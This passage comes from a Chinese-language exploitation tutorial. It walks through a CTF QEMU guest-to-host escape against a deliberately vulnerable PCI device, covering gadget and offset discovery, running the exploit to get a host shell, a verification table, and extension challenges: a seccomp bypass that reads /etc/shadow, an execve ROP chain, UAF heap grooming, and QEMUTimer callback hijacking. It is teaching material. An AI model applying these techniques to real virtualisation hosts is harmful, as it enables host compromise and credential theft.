# 3. 用 pahole 靜態確認（比 gdb 快，不需要跑起來）
pahole -C VulnState /opt/qemu-debug/bin/qemu-system-x86_64
pahole -C MemoryRegion /opt/qemu-debug/bin/qemu-system-x86_64

# 4. 找 gadgets
ROPgadget --binary /opt/qemu-debug/bin/qemu-system-x86_64 \
    --rop | grep "mov rsp, rdi"
ROPgadget --binary /opt/qemu-debug/bin/qemu-system-x86_64 \
    --rop | grep "xchg rax, rsp"
ROPgadget --binary /opt/qemu-debug/bin/qemu-system-x86_64 \
    --rop | grep "pop rdi"
# 記下各 gadget 相對 binary 起點的 offset

# 5. 找 system@plt 和 vuln_pci_ops offset
objdump -d /opt/qemu-debug/bin/qemu-system-x86_64 | grep -B2 -A5 '<system@plt>'
nm -n /opt/qemu-debug/bin/qemu-system-x86_64 | grep vuln_pci_ops
nm -n /opt/qemu-debug/bin/qemu-system-x86_64 | grep vuln_pci_mmio_ops

# 6. 把所有 offset 填進 exploit.c 的 placeholder，重編
gcc -O0 -static -o exploit exploit.c
# 或動態連結（確認 guest libc 版本）
gcc -O0 -o exploit exploit.c

# 7. 把 exploit scp 進 guest 或 virtfs 傳入
scp exploit user@guest-ip:/home/user/

# 8. 在 guest 裡執行（需 root 或 sudo 讀 BAR0）
sudo ./exploit

# 9. 驗收：
#    - host terminal 出現 sh-5.1# 或 bash-5.1#
#    - 在 shell 裡執行 id → 顯示 QEMU process 的 user（通常是執行 QEMU 的 host user）
#    - cat /etc/passwd → 顯示 host 的 /etc/passwd（不是 guest 的）

# 10. 如果失敗，在 gdb 的 QEMU 裡設 catchpoint
(gdb) catch signal SIGSEGV
(gdb) run
# exploit 觸發後，看 RIP / RSP 是什麼，對照預期值診斷
```

</details>

---

## 測試與驗收

| 項目 | 預期結果 | 實際結果 | 備注 |
|------|----------|----------|------|
| BAR0 mmap 成功 | `dev0 BAR0 mmap'd` 列印，無 segfault | | `lspci` 先確認 device 在哪個 slot |
| OOB read 不崩潰 | QEMU process 繼續跑，guest 正常 | | 先讀鄰近的合法範圍 |
| Leak: code ptr 非零 | `leaked ops ptr = 0x7f...` 形式 | | 確認 addr 落在 QEMU binary 的映射範圍 |
| Leak: heap addr 非零 | `dev1 VulnState = 0x...` 形式 | | 確認 addr 落在 heap 映射範圍 |
| QEMU base 對齊 | 最後 3 hex digits 為 `000`（page aligned） | | 如果不對齊，offset 算錯 |
| fake ops 寫入 | `payload written to dev0 buf` 後 QEMU 沒崩 | | 先不要觸發，只寫，確認 QEMU 穩定 |
| OOB write 不崩 | `dev1 ops ptr overwritten` 後 QEMU 沒崩 | | 觸發前先在 gdb 確認 dev1 ops ptr 已被改 |
| 觸發 → host shell | `sh-5.1#` 或 `bash` 提示符出現在 host terminal | | 執行 `id` 確認是 host user |
| host `id` 顯示正確 | 不是 guest 的 uid，而是跑 QEMU 那個 host user | | |
| QEMU guest 仍存活 | host shell 拿到後，guest 還能繼續操作 | | `system()` fork，不影響 QEMU main loop |

---

## 延伸挑戰

**挑戰 1：繞過 QEMU seccomp sandbox**

在啟動腳本加 `-sandbox on`，這時 `execve` 被 seccomp 過濾，`system()` 呼叫的 `sh` 無法啟動。

替代路線：
- 改用 `open("/etc/passwd", O_RDONLY)` + `read` + `write` 到 stdout 的 ROP chain（不需要 `execve`）
- 或反彈 socket：`socket` + `connect` + `dup2` + `execve` — 但 `execve` 還是被擋
- 最乾淨的解法：直接 ROP 讀 `/etc/shadow` 內容並 write 回 guest 的某個 fd

這條路會在 Ch 37 完整展開。

**挑戰 2：純 execve ROP chain**

不用 `system()`，改成完整的 `execve("/bin/sh", ["/bin/sh", NULL], NULL)` syscall：

```asm
pop rdi; ret  → &"/bin/sh"
pop rsi; ret  → &argv   (argv[0] = &"/bin/sh", argv[1] = 0)
pop rdx; ret  → 0       (envp = NULL)
pop rax; ret  → 59      (SYS_execve)
syscall
```

需要多找幾個 gadget，但不依賴 PLT，更乾淨。

**挑戰 3：不依賴第二個 device，用 UAF 打 ops ptr**

如果題目只有一個 vuln-pci device，需要另一個 primitive 讓 ops ptr 可寫。在 QEMU 裡尋找一個 UAF：分配一個 `MemoryRegion`、釋放它、再用 vuln-pci 的 buf（如果落在同一個 chunk）蓋掉回收後的內容。這需要 heap grooming，但不需要兩個 device。

**挑戰 4：改打 QEMUTimer.cb**

如果 vuln-pci device 有 timer（`timer_new`），`QEMUTimer` 結構體包含 `cb` 函數指標：

```c
struct QEMUTimer {
    int64_t expire_time;
    QEMUTimerList *timer_list;
    QEMUTimerCB *cb;   /* ← 劫持目標 */
    void *opaque;
    ...
};
```

OOB 打 `timer.cb` + `timer.opaque`，然後等 timer 觸發（或用 `timer_mod` 讓它立刻到期）。流程和打 ops ptr 一樣，只是觸發方式從 MMIO write 變成 timer callback。

---

## 本練習重點整理

- CTF QEMU escape 的核心是把三個 primitive 串起來：leak → 指標覆寫 → 執行
- `VulnState` 的 heap 佈局決定了 OOB 的可行性；兩個 device 的設計讓 forward OOB write 可以跨物件覆蓋
- fake `MemoryRegionOps` 技巧的關鍵：`endianness` 和 `valid_*` 欄位需要填合理值，否則 QEMU 在觸發前就崩潰
- `opaque` 欄位是 pivot 的樞紐——它被當成 RDI 傳進 ops->write，如果 pivot gadget 是 `mov rsp, rdi; ret`，直接用 opaque 控制 RSP
- 所有 offset 都必須在目標 binary 上量測，不能靠「理論估算」——`pahole` + `gdb` + `ROPgadget` 三工具缺一不可
- seccomp sandbox 是現代 QEMU 的額外防線，拿到 RIP control 不等於拿到 shell

---

## 自我檢核

- [ ] 我能解釋為什麼需要兩個 vuln-pci device，單個 device 的 OOB write 為什麼打不到自己的 ops ptr
- [ ] 我能用 `pahole` 看出 `MemoryRegion.ops` 在 `VulnState` 結構體裡的精確 byte offset
- [ ] 我知道 fake `MemoryRegionOps` 裡哪些欄位必須填合理值，哪些可以留零
- [ ] 我能解釋 `opaque` → pivot gadget → RSP 的控制流程，畫出暫存器狀態的變化
- [ ] 我知道為什麼 ROP chain 的 stack 需要 16-byte aligned 才能正確呼叫 `system()`
- [ ] 我能說出 `-sandbox on` 擋住哪個 syscall，以及繞過它的替代 ROP 路線
- [ ] 我有在 debug QEMU 上跑過 `gdb` 確認 leak 的 offset，而不是光看 skeleton 就當作完成

---

前面三個練習（A: 裝 QEMU + 調 debug 環境、B: OOB read/write primitive 驗證、C: 全流程 CTF chain）走完，你對 QEMU custom device 漏洞的攻擊面應該有完整的動手感。下一章進入 VirtIO 架構，看看生產環境裡真正廣泛部署的 QEMU 後端是怎麼設計的——以及攻擊面在哪裡移位。

→ [Ch 25](./25-virtio-architecture.md)
